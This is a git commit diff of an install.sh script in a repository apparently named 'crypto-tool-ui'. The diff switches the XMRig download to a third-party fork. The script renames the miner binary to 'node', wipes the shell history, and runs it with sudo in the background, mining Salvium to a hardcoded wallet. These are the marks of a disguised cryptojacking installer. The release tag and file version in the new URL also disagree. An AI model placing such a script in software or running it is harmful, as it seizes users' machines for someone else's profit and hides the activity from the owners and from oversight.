bf5885f9d10d16e77b2873a9ecc3e01637c819f9
crypto-tool-ui <joniiie1456@gmail.com>
2025-12-01 03:17:02 +0700

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,8 +1,8 @@
 #!/bin/bash
-wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-focal-x64.tar.gz
-tar -xf xmrig-6.24.0-focal-x64.tar.gz
-rm xmrig-6.24.0-focal-x64.tar.gz
-cd xmrig-6.24.0
+wget https://github.com/True-Mining/xmrig-zerofee/releases/download/v6.12.2/xmrig-6.16.2-linux-x64.tar
+tar -xf xmrig-6.16.2-linux-x64.tar
+rm xmrig-6.16.2-linux-x64.tar
+cd xmrig-6.16.2
 mv ./xmrig ./node
 history -c && history -w && clear
 sudo ./node --coin="XMR" --randomx-1gb-pages --donate-level 0 -o sg.salvium.herominers.com:1230 -u SC1siHCYzSU3BiFAqYg3Ew5PnQ2rDSR7QiBMiaKCNQqdP54hx1UJLNnFJpQc1pC3QmNe9ro7EEbaxSs6ixFHduqdMkXk7MW71ih.CPU2 -p x -k -t 4
